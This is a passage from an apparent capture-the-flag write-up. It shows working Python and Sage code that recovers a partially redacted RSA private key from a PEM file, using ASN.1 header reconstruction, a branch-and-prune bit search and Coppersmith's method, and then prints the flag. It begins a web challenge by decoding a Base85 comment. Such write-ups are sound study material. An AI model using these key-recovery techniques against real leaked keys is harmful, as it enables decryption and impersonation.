f? ?? ?? ?? ?0 ?? ?? ?? ?? ?? 1? ?? ?? ?1 26 03
56 ?? 72 c5 ?? ?? ?0 ?? c? ?b ?? ?? d? ?? 4? ?4
bd 27 87 b2 4? ?? ?? ?? ?8 ?? 57 5? ?? 8? ?b ??
49 d? ?? ?? ?? ?b ?? ?? ?? a? ?? ?? ?? ?? ?? ??
fc ?? ?? f? ?6 ?? 2? ?f 5? ?? ?? a? ?0 fb ?? ??
?9 ?? 6? ?8 ?? 1? ?b ?? ?? ?? ?? 0? ?? ?? ?f ??
f? ?? ?? 7? ?7 ?? ?? ?e d9 ?? 4? ?? ee 3? ?? f5
0? ?? 8? ?? ?? ?? f? ?f ?? ?e dd ?? ?? ?? ?? a?
?9 ?? ?? ?6 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? c? ?? ?? b? ?? b? ?? ?f c? ?? ?? c? ?? ?d ??
?? ?? ?? b? ?? ?? ?? ?? 8? ?c ?? ?? ?? ?d 0? ?1
?? ef 3? ?? ?? ?? ?2 4? ?b a2 ?? ?? ?? ?? d? ??
?? ?? ?? ?? ?1 ?? 04 8d ?? ?? ?9 a9 ?? ?? ?7 3?
?? ?? ?? ?? ?? 6? ?? ?5 2? ?? ?7 ?? ?? ?? ?? ??
?6 ?? ?? ?? ?? 5? ?4 ?? ?6 ?? 8? ?? ?? ?? c? ?5
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ??
```

And so we will have to understand how `PEM` files are created. There are many sites that explain this, but I found this (https://medium.com/@yashschandra/anatomy-of-a-pem-file-727f1690df18) to be highly helpful in the context of RSA.

More specifically, data in an rsa private.pem file is encoded as a *SEQUENCE* of *integers* corresponding to, in this specific order, `version`, `n`, `e`, `d`, `p`, `q`, `dp (d % (p-1))`, `dq (d % (q-1))`, `qinv (pow(q, -1, p))`.

With regards to the `pem` headers before each of these integer values are encoded, I found the website (https://letsencrypt.org/docs/a-warm-welcome-to-asn1-and-der/) immensely helpful in demystifying it. Knowing how the headers are supposed to look like, it unironically does not take long to derive the actual locations of the headers. In fact, the partial hex data alone helps to narrow down where the 2048-bit n, assumed 0x10001 e, 2048-ish-bit d, 1024-bit p,q,dp,dq start and end, and also lets us determine whether they take `0x80` bytes or `0x81` bytes to store (for the 1024-bit unknowns that is)

With some puzzle-solving and basic critical thinking we restore the proper `02 82/81 .. ..` headers before each integer in the sequence. Knowing the last few hex values of `p`, `q` and the full value of `n`, we use the equation `p*q (mod 2^i) == n (mod 2^i)` to recover the values of `p, q mod 256**2`, and update the hex values accordingly. This will come in handy later.

```
30 82 04 a3 02 01 00 02 82 01 01 00 cf 7a 26 ef
b8 e9 58 5a ed 01 46 4d 3d 3d bd 4d 80 88 27 31
fc 2d 31 b2 8d 94 f8 9e e1 14 c8 63 a9 05 77 51
21 a0 b8 eb e8 d5 06 99 2b 93 8b cc 18 04 49 3f
0d 63 ea 15 8c e7 45 a5 23 c4 2a fe c8 91 53 7b
ad da 15 c3 7a 82 c7 ba 0c 49 64 49 03 b1 1c 42
37 6e a4 1c 13 19 36 ce 4f 41 62 8b 1c cd 4f e2
9e f4 8d 5a df ce b2 3b 36 5b 8a 9e a8 b0 2c c5
d6 3f ef 77 89 47 71 d4 e2 2e 07 74 65 fd 20 9d
fc 53 e1 cb 8b 7d 76 f6 41 60 d9 2e 1d 02 a3 63
e0 2a 6a 77 56 a8 92 e4 1a 32 69 9f 72 bc 11 5d
37 ea 0f 45 72 14 06 ef 87 31 d4 95 eb 14 9b b4
2e a0 0c a3 4a af f1 7a a1 30 8b 43 1a 78 f1 d1
cb c5 ce a8 55 a7 78 20 ff 1c 77 29 3e 3e f8 f9
2f 2c 98 91 34 75 65 40 61 02 b7 5b 5d aa ca 0f
eb 05 9d e5 14 71 42 53 9c aa 46 59 f1 89 e9 73
45 55 7c 8d 31 8b e1 7b 10 b0 a4 f9 02 03 01 00
01 02 82 01 00 ?d ?? 6? ?? ?? ?? ?d ?? ?? 8? ?8
?? a? ?? ?? ?? ?? ?? ?? ?? 9? ?? ?? ?? 2? ?2 ??
?? ?f ?? ?6 ?? e? ?a d7 ?? ?a ?? e? ?? ?? ?? ??
?? ?? ?c ?? ?? ?a f3 c? ?7 ?? 5? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?2 a? ?? ?? ?? c? ?? 16 c? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?8 cc ?? ??
?? ?? ?e ?? 68 6b ?? 0? ?? ?? ?? ?b 42 0? ?2 ??
?? ?a 58 ce c? ?? ?? f? ?5 8? ?? ?? 1? ?? ?? ??
?? ?? ?? ?b e4 ?? ?? ?? ?? c? ?? ?? ?? ?e 4? ??
?? ?? ?? ?? ?? 9? ?? 1? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? 62 ?? ?? ?? ?? 86 1? ?? f? ?c 97 ??
?0 ?? ?? 9? ?? ?? 7? ?? ?? ?? ?c ?? ?5 af ?? de
?? ec f? ?? ?? ?? ?? ?? 8? ?6 ?? ?? ?? ?? bd ??
?? c? ?a ?? b? ?? ?? ?? ?8 ?? ?? ?? ?? ?? ?? ??
?? ?c ?? 45 ec ?? ?? ?? e? ?2 ?? ?? ?? ?? 4? ??
?? a? ?? ?? ?? 60 50 ?? ?2 ?? b? ?? ?? ?? ?d 75
?? ?? ?8 ?? ?? 02 81 81 00 ?? ?? ?2 ?? ?6 92 ??
?? ?3 ?? ?9 ?? ?? ?? ?? ?? ?? ?? c? ?? ?? b? ?7
?? 1? ?1 fd ?? ?8 b8 ?? ?d ?? ?? ?? ?? ?? ?a ??
f1 e? ?? 6? ?? ?? ?? ?b ?? ?? ?? ?? ?? 0? ?? ??
?? ?? ?? ?? ?? ?? 32 d4 9? ?? ?c ?? ?? ?? ?? ??
?? 1? ?? ?? ?? ?? ?? 2? ?? ?4 ?? ?b 50 ?? 9? ?b
0a 5? ?? ?? ?e ?? ?? ?? ?3 ?? ?? ?? ?? 8? ?b 07
34 5d ?? ?? ?? ed 6? ?? ?? ?? ?? d? ?? ?? 3? ??
?? ?? 2? ?9 ?? ?c ?? b5 87 02 81 81 ?? ?? 45 ??
?? ?? ?? ?? ?? ?b ?? 0? ?? 8? ?e ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?0 1b ?? ?? ?? ?? 1a ?? a? ?2 
?? ?? ?? ?? ?? 23 2d ?? ?? ?? ?? ?? ?6 a? ?? ??
?? ?5 71 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?1 a4 ??
c? ?? ?? ?? ?? d? ?? ?? 7? ?9 b3 ?? a? ?? ?? ??
?7 ?? 8c ?? ?? 25 e9 ?? f? ?? 8? ?? ?c 6c 8? ??
?? ?? ?f 03 62 55 ?? 9? ?f 7a b? ?? ?? ?? ?? d?
?? ?? ?? ?? ?? ?? ?? ?? 4? ?? ?? 71 7f 02 81 80
?? ?? ?? ?? ?? 6? ?e ?? ?? ?? 2? ?7 ?? d? ?c ??
f? ?? ?? ?? ?0 ?? ?? ?? ?? ?? 1? ?? ?? ?1 26 03
56 ?? 72 c5 ?? ?? ?0 ?? c? ?b ?? ?? d? ?? 4? ?4
bd 27 87 b2 4? ?? ?? ?? ?8 ?? 57 5? ?? 8? ?b ??
49 d? ?? ?? ?? ?b ?? ?? ?? a? ?? ?? ?? ?? ?? ??
fc ?? ?? f? ?6 ?? 2? ?f 5? ?? ?? a? ?0 fb ?? ??
?9 ?? 6? ?8 ?? 1? ?b ?? ?? ?? ?? 0? ?? ?? ?f ??
f? ?? ?? 7? ?7 ?? ?? ?e d9 ?? 4? ?? ee 3? ?? f5
02 81 81 ?? ?? ?? f? ?f ?? ?e dd ?? ?? ?? ?? a?
?9 ?? ?? ?6 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? c? ?? ?? b? ?? b? ?? ?f c? ?? ?? c? ?? ?d ??
?? ?? ?? b? ?? ?? ?? ?? 8? ?c ?? ?? ?? ?d 0? ?1
?? ef 3? ?? ?? ?? ?2 4? ?b a2 ?? ?? ?? ?? d? ??
?? ?? ?? ?? ?1 ?? 04 8d ?? ?? ?9 a9 ?? ?? ?7 3?
?? ?? ?? ?? ?? 6? ?? ?5 2? ?? ?7 ?? ?? ?? ?? ??
?6 ?? ?? ?? ?? 5? ?4 ?? ?6 ?? 8? ?? ?? ?? c? ?5
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
?? ?? ?? ?? ?? ?? ??
```
Which we then decode (first by converting this back to binary and merging with the paritally decoded base64 data) and obtain the values for `n`, `e`, `d`, `p`, `q`, `dp`, `dq` (guesssed correctly to use `0x81` bytes, it was either `0x80` or `0x81`), and `qinv` (latter of which is completely unknown so we'll ignore that)

```py
bin_pt = hex_to_bin(hex_pt)
assert len(bin_pt) == len(partial_pt)
out = ""
for i,j in zip(bin_pt, partial_pt):
    if i != '?':
        out += i
        assert (i==j) or (j == '?')
    elif i == '?' and j != '?':
        out += j
    else:
        out += '?'
out_bin = out # since this is now after we get the right offsets!

def read_pem_data_from_bin(bin_str):
    i = 32
    out = []
    while True:
        data_type = bin_str[i:i+8]
        if data_type == '00000010':
            try:
                data_len = int(bin_str[i+8:i+16],2)
            except:
                break
            try:
                i += 16
                if data_len >= 128:
                    len_bytes = data_len - 128
                    data_len = int(bin_str[i:i+8*len_bytes],2)
                    i += 8*len_bytes
            except:
                break
            data = bin_str[i:i+data_len*8]
            i += data_len*8
            try:
                out.append(int(data,2))
            except:
                out.append(data)
        else:
            break
    return out

version, n, e,d, p,q, dp,dq = read_pem_data_from_bin(out_bin)
pad = lambda x: "0" * (1024-len(x)) + x
p = pad(p)[::-1] # we reverse these for convenience later on
q = pad(q)[::-1]
dp = pad(dp)[::-1]
dq = pad(dq)[::-1] 
d = pad(d)[::-1]

print(f'n = {n}')
print(f'e = {e}')
print(f'p = {p}')
print(f'q = {q}')
print(f'dp = {dp}')
print(f'dq = {dq}')
print(f'd = {d}')
```

Output:
```py
n = 26191564571207865803659079386216562920365743937051163433571210679225063647091082587257715669756485899193035208469976035738059784724348440070923338255026181997563861328562376469415513279917957395542741541429134095225386135220540927874676394354088360479481955915341958270722056286102261431573282803952793459642793864316123517546752697514637037955503796798930707520651108244395501602445588782475135899939892422822256499112247770956183176429072812823174574240664993265247180146106488076712548920459190957713108289707082714400895643134613721697077267869186086353168834023098632217473990464991482806559422568127693472179449
e = 65537
p = 1110000110101101??????000011????????????100110??????010001????????????????????????001100??????????????????001011????????????????????????????????????011010110111????????????????????????101110100010110011100000110111??????000111??????????????????????????????110010????????????????????????110111????????????????????????101001010000110101??????100111??????000010101101????????????001010????????????010100??????????????????????????????????????????101000????????????????????????????????????????????????001100????????????001001001010110100110000??????????????????????????????????????????????????????????????????000010????????????????????????????????????111101??????????????????????????????000110????????????011110001111??????010101??????????????????????????????????????????001011????????????000111010001????????????101111111000??????101000??????111110??????101101??????????????????010011??????????????????????????????????????????????????????101001????????????110001??????????????????010010010110????????????010001??????????????????00000000
q = 1111111010001110??????????????????000010??????????????????????????????????????????????????????????????????001011????????????????????????????????????110101011110111100??????100100??????101010100100011011000000111101??????????????????????????????000100110110001101????????????010001????????????111110??????100101111010010001????????????110011000111??????111011??????????????????????????????010111??????110011011001??????001110??????????????????001011????????????????????????????????????001110??????001001011000????????????????????????????????????????????????????????????????????????????????????100011101010??????????????????????????????010101011000??????????????????????????????????????????101101001100010001????????????????????????????????????000100??????010101??????000101100000??????????????????????????????110110000000??????????????????????????????????????????????????????????????????????????????????????????100111??????100001????????????000001??????110110????????????????????????????????????????????????101010001010????????????00
dp = 10101111????????????110001110111????????????001011??????100110110111??????????????????011110??????011110??????????????????111111??????101111????????????????????????000010??????????????????????????????110100??????100000??????000100??????011000??????100100??????????????????110111110000??????010101??????????????????101010111111??????010001??????011000??????111110????????????110011111111????????????????????????????????????????????????100101????????????????????????110110??????????????????????????????101110010010??????101101??????000001????????????101011101010??????110001??????????????????????????????110010010011011110000111100100101111010010??????100010????????????101111????????????011101??????110011??????110000??????????????????001010001101001110??????000110101011000000011001001000????????????????????????100001????????????????????????????????????110000??????????????????????????????101111??????010011??????111011??????101110??????100100????????????????????????011110??????011011????????????????????????????????????10
dq = ????????????????????????101011??????001100????????????????????????000001??????100110????????????001000??????101010??????????????????????????????011010??????????????????????????????????????????111000????????????010100101010????????????100110??????????????????????????????????????????011100111000??????????????????100101011001??????????????????001011000100100000??????111000????????????????????????????????????????????????101101??????????????????????????????010001011101??????000010010011??????????????????????????????110011110111??????011000??????100000101101????????????????????????110011??????110001????????????????????????????????????110101??????????????????????????????101110????????????100011??????????????????010011111100????????????011101????????????110110??????????????????001101??????????????????????????????????????????????????????????????????????????????????????????????????????011001??????????????????100111??????010101??????????????????????????????101110110111????????????111110??????111111????????????????????????
d = ????????????????000110??????????????????101011101011??????????????????????????????011101??????000100????????????000010100000011000????????????????????????100101??????????????????100010??????????????????????????????010100??????110111????????????????????????001101111010001000??????001101??????????????????????????????????????????????????????????????????000110??????????????????????????????110100??????010111??????001101????????????011011110101??????????????????????????????011010??????000101??????????????????????????????????????????111100110111??????000111101100??????111101011010????????????001101??????????????????????????????111010??????????????????100101????????????010000????????????111010010011??????111111????????????100001100001??????????????????????????????100100011000????????????????????????????????????????????????????????????????????????????????????????????????001000????????????100110????????????????????????????????????????????????010010011101??????????????????????????????001110??????????????????????????????001001111101??????????????????????????????????????????????????????101000??????????????????010001101001??????111110??????????????????001101110011000110100101??????????????????110100??????110000010000101101??????????????????????????????000000??????111101011000010110??????100111????????????????????????????????????001100110001????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????001101101000????????????001110????????????????????????100101010011????????????????????????????????????????????????????????????????????????????????????111010??????001110??????110011110011110101??????????????????100011??????????????????????????????????????????????????????010111??????100101????????????111010110101??????000111??????010110????????????111100??????????????????010011??????010000????????????????????????111001????????????????????????????????????????????????????????????010110??????000110??????000111????????????111011??????????????????????????????010110??????111011????
```

And so now the challenge is, given these partial values, we are to recover the rest of the data. Now we can construct a few equations from our understanding of RSA.

```py
(1) p*q == n
(2) e*d - 1 == k * (p-1) * (q-1)
(3) e*dp - 1 == kp * (p-1)
(4) e*dq - 1 == kq * (q-1)
```
Where `k`, `kp`, `kq` are positive integers. Notice that all 3 of these values must be greater than 0 and less than or equal to `e`. We'll leave this as an exercise to the reader.

More importantly, we also deduce 2 more equations as shown:
```py
Since (e*dp - 1 + kp) == kp * p, (e*dq - 1 + kq) == kq * q, by (3), (4),
Therefore (e*dp + (kp - 1)) * (e*dq + (kq - 1)) == kp * kq * n
Thus we get (5) 

(5) (kp - 1) * (kq - 1) == kp * kq * n (mod e)

Since (e*dp - 1) * (e*dq - 1) == kp * kq * (p-1) * (q-1) by (3), (4),
Therefore 1 == kp * kq * (e*d - 1) // k (mod e)
Thus we get (6)

(6) k  == - kp * kq (mod e)
```
Equations `(5)` and `(6)` allow us to get unique `kq` and `k` from `kp`, mod e.

Now observe that `(1), (2), (3), (4)` apply modulo 2^i for any positive integer i.

Thus, we can use the 4 equations in a branch-and-prune algorithm to slowly recover `p, q, dp, dq`, one bit at a time. Interestingly while playing around I'd noticed that the branch-and-prune tree took particularly long at `kp = 30590`, and expands rapidly at around 800+ bits. I figured to print all the possible prime values at the 700th bit, and found that the tree collapses to only a single value. This single value maintains its distinctiveness up till the 820th bit, which I've recorded and shown in the following algo:

```py
lsb_p = int(p[:16][::-1],2) # gets first 16 bits of p
lsb_q = int(q[:16][::-1],2)
lsb_dp = int(dp[:8][::-1],2)

# print(hex(lsb_p), hex(lsb_q), hex(lsb_dp))

from itertools import product
def get_combinations(pbits,qbits,dpbits,dqbits,dbits, cnt):
    out = set()
    b0, b1, b2, b3, b4 = False, False, False, False, False
    for x0,x1,x2,x3,x4 in list(product('01',repeat=5)):
        if len(pbits) < cnt + 1:
            pbits = x0 + pbits
            b0 = True
        if len(qbits) < cnt + 1:
            qbits = x1 + qbits
            b1 = True
        if len(dpbits) < cnt + 1:
            dpbits = x2 + dpbits
            b2 = True
        if len(dqbits) < cnt + 1:
            dqbits = x3 + dqbits
            b3 = True
        if len(dbits) < cnt + 1:
            dbits = x4 + dbits
            b4 = True
        out.add(str([pbits, qbits, dpbits, dqbits, dbits]))
        pbits = pbits[1:] if b0 else pbits
        qbits = qbits[1:] if b1 else qbits
        dpbits = dpbits[1:] if b2 else dpbits
        dqbits = dqbits[1:] if b3 else dqbits
        dbits = dbits[1:] if b4 else dbits
    return list(eval(i) for i in out)


# We use our recovered last 16 bits of p, q, as well as the known last 8 bits of dp to narrow possible kp values
kps = []
for kp in range(0, e):
    if kp * (lsb_p - 1) % 256 == (e*lsb_dp - 1) % 256:
        kps.append(kp)

STOP = False
max_score = 0
# kps = [30590]
for _ in range(len(kps)):
    kp = kps[_]
    if STOP:
        break

    # Derive kq and k
    for kq in range(0, e):
        if (kp-1)*(kq-1) % e == kp*kq*n % e:
            break
    assert (kp-1)*(kq-1) % e == kp*kq*n % e
    k = -kp * kq % e
    print(f'Derived kp, kq, k = {[kp, kq, k]}')

    stack = [['', '', '', '', '', 0]]
    cnt_max = 0
    slen = 0
    ptr = 0
    partition = 10000 # debug purposes
    while stack:
        slen = len(stack)
        pbits, qbits, dpbits, dqbits, dbits, cnt = stack[0]
        if cnt >= 820:
            ff = open('BIG_PRIMES.py','ab')
            ff.write(str(stack[0]).encode() + b',\n')
            ff.close()
            cnt_max = 0
            print("Wrote one prime to BIG_PRIMES.py")
            # Seems coppersmithable
            stack = stack[1:]
            continue

        ptr += 1
        if not ptr % partition:
            print(f'Iteration {ptr}, stack length {slen}, current cnt {cnt}')

        stack = stack[1:]

        if p[cnt] != '?':
            pbits = p[cnt] + pbits
        if q[cnt] != '?':
            qbits = q[cnt] + qbits
        if dp[cnt] != '?':
            dpbits = dp[cnt] + dpbits
        if dq[cnt] != '?':
            dqbits = dq[cnt] + dqbits
        if d[cnt] != '?':
            dbits = d[cnt] + dbits

        # assert max([len(i) for i in [pbits,qbits,dpbits,dqbits,dbits]]) == cnt+1, f"Error at {cnt+1}"
        for comb in get_combinations(pbits,qbits,dpbits,dqbits,dbits, cnt):
            tp, tq, tdp, tdq, td = [int(i,2) for i in comb]
            modulus = 2**(cnt+1)
            if (e * tdp - 1 + kp) % modulus != (kp * tp) % modulus:
                continue
            if (e * tdq - 1 + kq) % modulus != (kq * tq) % modulus:
                continue
            if (tp * tq) % modulus != n % modulus:
                continue
            if (e * td - 1) % modulus != (k * (tp-1) * (tq-1)) % modulus:
                continue
            stack = [comb + [cnt+1]] + stack
```

Output:
```py
...
Derived kp, kq, k = [30462, 22469, 17750]
Derived kp, kq, k = [30590, 64743, 39770]
Iteration 10000, stack length 41, current cnt 149
Iteration 20000, stack length 42, current cnt 148
Iteration 30000, stack length 41, current cnt 149
Iteration 40000, stack length 40, current cnt 148
Iteration 50000, stack length 42, current cnt 147
Iteration 60000, stack length 63, current cnt 392
Iteration 70000, stack length 81, current cnt 462
Iteration 80000, stack length 78, current cnt 463
Iteration 90000, stack length 81, current cnt 465
Iteration 100000, stack length 81, current cnt 468
Iteration 110000, stack length 77, current cnt 461
Iteration 120000, stack length 80, current cnt 464
Iteration 130000, stack length 81, current cnt 464
Iteration 140000, stack length 80, current cnt 465
Iteration 150000, stack length 104, current cnt 588
Iteration 160000, stack length 107, current cnt 592
Iteration 170000, stack length 105, current cnt 592
Iteration 180000, stack length 133, current cnt 669
Iteration 190000, stack length 140, current cnt 684
Iteration 200000, stack length 132, current cnt 689
Iteration 210000, stack length 128, current cnt 668
Iteration 220000, stack length 129, current cnt 672
Iteration 230000, stack length 157, current cnt 807
Wrote one prime to BIG_PRIMES.py
Iteration 240000, stack length 138, current cnt 682
Iteration 250000, stack length 129, current cnt 667
...
```

`BIG_PRIMES.py`
```py
['0001111111011111000010101000101110001011100101111101001011100110011100100100111100011111001110101010100011001111000111100001010101110110000011111101011011010011101011001011111010111110000010110100000000001000110100001011001101001001101101001100011001011100011100001111010111111011010000110010110101001001000010111000110011001001000111010100011110100111110000001010100111100001010101110001100010100111111001100111101101000010101001111110010101001011001000001011010100000111111110011110111010110000101001011000000010011101110000011110111010010011111111101010110100110000011010010001000101100110001110001101001110110000011100110100010111010001101100010010001101011110110101100001001101100110011011001001101010001101001111000110100001100011000000111101001001011000011000100010100110011101010111111100000010011011010110000111', '0000000110110101010011111010101111111111100000011010001001011010101100100010001100100011100001101111100010001111001000100011001011010101101001010110100010111100000001000001100001101010100110001101101101111000100000100101011100011000001100010001010110101100010010010010001101110111110010110010000000001011111001010001101001001110100111001001100011110100000110010100100011101101001101111110111110100111000100101001101100111101001110101000110000111111110000011110011101111000111110001100110111111010111000100101111010011011000111110000110010001000101000010011011011000110110010000111011011110100001100100001011011110000001101100010010101010001100010011110110011110111101010111001101010011111010010000110000001011101000110010001011101100011101000000001100110001100110110100010000111110100000011111011000010010111000101111111', '0110000101111011111111000011001000010010011000000011010101100010101101110010110001010011010010010101000000001110000011001101111010111011100100101011110100010101011001000110011001001011110100100111100001111011001001001101111011101010101000100110010010001100001101010111010110111011011010000010100110110101000101001001110100001100001010101000110010001101101100101001001000011000110010100100110010001001111000100011110011011010011010011111111111001110110001110101111101111000011011111010001010000111111101010101100001001001010010101000001000001111101101100010101000100100100101001000011000111000100011101000000111010000101101001001110101111100001110010001000001100111011011011100100011110100010111111111000011101011110001111010110001111001101110110000100011101101100101000011010000010100011011101110001100111010000111110101', '0001111110011011111001010110110001001110010010101101101101111111111010111011000101101000111111001000001001111010101011000101011100111001110101100110000110000100001101000010101110000110110010110010000100101101100010001101110111001111100010010101011000010110110100000101111000011000100011101111001101000110101011001111101011110011001001000010001010111010001010100110110001101111111001001010110101111101000010001001010110010001110001000101000000011111000000000100100011010010101010100100000010011010100100111001110011010000011100111011100011100111000101010001010001001111000001100110010011110101010100101011001001110100011101011001100100100010010101110011011001100001011010100000011010100011010010100101010111100000010000101101010001100111010110000001011101000101100111011000110010100011010101100000100010100111000010110011', '0110101010000100001100001011010101010010010001100010011110010000100100011100000110001000011000011100100011001111111100011100100101110010101010010000100110010011101010010000100110011101110101110101110111000111111101101101001011000010111111110101101011110010000011011110000000011110110011110001011001001101011101011000101010101100111010000110000101100010011100010101011110010101011010111101101001101101001011000101111110100001000010111100110001101100001100011011100110000111101000001101010000101101110101010001110100110111010100011100101011000001100001000101111011001011010011101010010100011110110101110010100111010011011111000101000001110100010011001001010110101010010111110110101001110011010001100000010100000100100100000010001011011011101111100011011001000001011110011101011101011101101101011000110110000000001111001001', 820],
```

Now with the lower 820 bits of a prime, we can apply Coppersmith's attack to recover one of the primes using sagemath as shown:
```py
n = ...
lowp = ...
F.<x> = Zmod(n)['x']
highp = (2**820 * x + lowp).monic().small_roots(X=2**(1024-820), beta=0.49)[0]
# [21062180458252532985655508074566037438560036768095752452755821]
# X is meant to indicate upper boundary for highp, beta is set as 0.49 in the event our prime `p` is less than the other prime that makes up n
p = 2**820 * highp + lowp
print(p)
# 147265078724969536365832804097158908382797954720876979653011951728406956112387192598824544012306646169035006144198481048711301331247260259281889124056472140003652896595645729235440361839211945606851933815085064600602384039806104472396638159553493474999959228820209555647809413406679561108752796856362130322823
```

And so we recover the remaining unknowns `q`, `d`, `dp`, `dq`, `qinv`, and attain the original `private.pem` file with:
```py
q = ...
p = ...
n = p*q
e = 0x10001
d = pow(e, -1, (p-1)*(q-1))
dp = d % (p-1)
dq = d % (q-1)
qinv = pow(q, -1, p)

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

private_key = rsa.RSAPrivateNumbers(
    p=p,
    q=q,
    d=d,
    dmp1=dp,
    dmq1=dq,
    iqmp=qinv,
    public_numbers=rsa.RSAPublicNumbers(e=e, n=n)
).private_key(default_backend())

pem_private_key = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)

with open("privkey.pem", "wb") as f:
    f.write(pem_private_key[:-1]) # some NULL byte at the end


f0 = open('privkey.pem','rb').read()
f1 = open('sparse.pem','rb').read()

assert len(f0) == len(f1)
for i,j in zip(f0,f1):
    assert i==j or j == ord('?')
```

We then run `md5sum privkey.pem | awk '{print "flag{"$1"}"}'` to obtain the flag,
`flag{8b3529db0451f4d20226f8280ba40bfb}`
<div style="page-break-after: always;"></div>

## Web
### Secrets (43 Solves, 207 Pts)
---

A quick look at the HTML source code reveals a commented out
```html
  </body>
  <!--
  /dgU&SDoc`ifns9@;p0<E-VfMPap`tJDufD+CT>4ATVu#ifo$;+<][.SDoc`ifns9@rl\uifo$;+<][.Jfl0YifotmP^qbXJ08fF@rEu.D.7's/o><?/n8sD$K@;%+<VfdP_(##+QAWUifnuQP^jlqBk)'6@=!':AM.h6DD#F?EsgokJfl0Yifo$;+<][.SDoc`ifns9E+rg#/n/X>AM.h6DD#F?EsgokJfl0Yifo$;+<][.SDoc`ifns9E+rg#/n908DD#d?DD#F?EsgokJfl0Yifo$;+<][.SDoc`ifns9E+rg#/nT69BQIlr/o><?/n8sD$K@;%+<VfdP_(##+QAWUifnuQP^jlqBk)'6B6%QpDD#d?DD#F?EsgokJfl0Yifo$;+<][.SDoc`ifns9E+rg#/n]39GqNrJDD#F?EsgokJfl0Yifo$;+<][.SDoc`ifns9E+rg#/no36BkM?:D/!l?@rl\uifo$;+<][.Jfl0YifotmP^qbXJ08fF@rEu7@:Wq%D/!l?@rl\uifo$;+<][.Jfl0YifotmP^qbXJ08fF@rEu9Bl.E6D/!l?@rl\uifo$;+<][.Jfl0YifotmP^qbXJ08fF@rEu<Ea`iuAM.h6DD#F?EsgokJfl0Yifo$;+<][.SDoc`ifns9E+rg#/oYNBCG'I<DD#F?EsgokJfl0Yifo$;+<][.SDoc`ifns9E+rg#/oYrME,00*/o><?/n8sD$K@;%+<VfdP_(##+QAWUifnuQP^jlqBk)'6E-62?Ch559Bl5P5F)q]JP_(##+QAW;+<VfdPap`tJDufD+E2%)D_?'AA1h_5DD#F?EsgokJfl0Yifo$;+<][.SDoc`ifns9E+rg#/otH=A1h_5DD#F?EsgokJfl0Yifo$;+<][.SDoc`ifns9E+rg#/oti;FCd(ABl5P5F)q]JP_(##+QAW;+<VfdPap`tJDufD+E2%)D_?3IDes!,/o><?/n8sD$K@;%+<VfdP_(##+QAWUifnuQP^jlqBk)'6H"Cf.Dg*gNBl5P5F)q]JP_(##+QAW;+<VfdPa(0lJDufD+E2%)D_??MDIY;9Bl5P5F)q]JP_(##+QAWMifnuQP^jlkEsgokJfl0Y+<VdLifotmP^qbXJ08??Ci=>GE+rftATBD<EsgokJfl0Y+<VdLifotmP^qbXJ08NDD.P>7EsgokJfl0Y+<VdLifotmP^qbXJ08THF_,T=/Mf"</hntqBl5P<EsgokJfl0Y+<VdLifo\eP^qbXJ08ZHB5)69C3'aAPap`tJDufD+D5h7Bk)(%DI6mlDItM?Gm`PqSDoc`ifns9E,T]<CghEs/oZ(CifotmP^qbXJ08lDEHPu9ASl!rFE9'VG]X;PPa(0lJDufD+EV13E,8s)ATJ2$+<VfdPap`tJDufD+C\c#AM.Y<D/9P%+<VfdPap`tJDufD+DG_(AU#h@FDYh$+<VdLifo\eP^qbXJ08ZHB5)69BQS*-
  -->
</html>
```

This is identified as Base85 encoding which decodes into what appears to be the directory traversal of the files used in the web application

```css
.
├── app.py
├── assets
│   ├── css
│   │   ├── pico.amber.min.css
│   │   ├── pico.azure.min.css
│   │   ├── pico.blue.min.css
│   │   ├── pico.cyan.min.css
│   │   ├── pico.fuchsia.min.css
│   │   ├── pico.green.min.css
│   │   ├── pico.grey.min.css
│   │   ├── pico.indigo.min.css
│   │   ├── pico.jade.min.css
│   │   ├── pico.lime.min.css
│   │   ├── pico.orange.min.css
│   │   ├── pico.pink.min.css
│   │   ├── pico.pumpkin.min.css
│   │   ├── pico.purple.min.css
│   │   ├── pico.red.min.css
│   │   ├── pico.sand.min.css
│   │   ├── pico.slate.min.css
│   │   ├── pico.violet.min.css
│   │   ├── pico.yellow.min.css
│   │   └── pico.zinc.min.css
│   └── js
│       ├── color-picker.js
│       ├── home.js
│       ├── jquery-3.7.1.min.js
│       └── login.js
├── gunicorn_conf.py
├── populate.py
